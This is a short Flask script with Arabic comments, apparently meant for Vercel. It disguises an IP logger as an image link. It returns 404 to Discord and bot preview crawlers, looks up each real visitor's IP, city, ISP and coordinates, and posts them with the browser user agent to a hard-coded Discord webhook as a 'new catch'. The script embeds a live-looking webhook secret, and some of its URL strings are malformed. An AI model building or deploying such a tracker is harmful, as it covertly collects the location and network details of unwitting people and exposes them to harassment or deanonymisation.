from flask import Flask, request, send_file
import requests
import io

# Vercel يبحث عن متغير باسم app أو application
app = Flask(__name__)

# إعداداتك
WEBHOOK_URL = "https://discord.com/api/webhooks/1493558963869061224/tY_NAc83SlbAMed-ibT8MdFhC88Owdqb-naTrn6q5-En386EXCCqZBByyhiPg6S7JBOr"
IMAGE_URL = "https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcRvw7uLGr6ScxbGYJhGNqEjXnW-e6nJaE5c0w&s"

@app.route('/api/image')
def logger():
    user_agent = request.headers.get('User-Agent', '')
    # الحصول على الـ IP الحقيقي عبر بروكسي Vercel
    ip_header = request.headers.get('x-forwarded-for', request.remote_addr)
    ip = ip_header.split(',')[0] if ip_header else request.remote_addr

    # 1. منع ديسكورد من المعاينة (تظهر كصورة مكسورة حتى يفتحها الشخص في المتصفح)
    if "discord" in user_agent.lower() or "bot" in user_agent.lower():
        return "Not Found", 404

    # 2. جلب معلومات تفصيلية جداً باستخدام IP-API
    try:
        data = requests.get(f"http://ip-api.com{ip}?fields=16976857").json()
        
        embed = {
            "title": "🚨 صيد جديد - معلومات مفصلة!",
            "color": 0xFF0000,
            "fields": [
                {"name": "📍 الموقع", "value": f"{data.get('city')}, {data.get('regionName')}, {data.get('country')}", "inline": True},
                {"name": "🏢 شركة الاتصالات", "value": data.get('isp'), "inline": False},
                {"name": "🖥️ نوع الجهاز والمصفح", "value": f"```\n{user_agent}\n```", "inline": False},
                {"name": "🌐 الإحداثيات", "value": f"[{data.get('lat')}, {data.get('lon')}](https://google.com{data.get('lat')},{data.get('lon')})", "inline": True}
            ],
            "footer": {"text": f"IP Address: {ip}"}
        }
        requests.post(WEBHOOK_URL, json={"embeds": [embed]})
    except Exception as e:
        print(f"Error logging: {e}")

    # 3. إرسال الصورة الأصلية للمتصفح
    img_res = requests.get(IMAGE_URL)
    return send_file(io.BytesIO(img_res.content), mimetype='image/png')

# ضروري لتعريف Vercel على نقطة الانطلاق
if __name__ == "__main__":
    app.run()
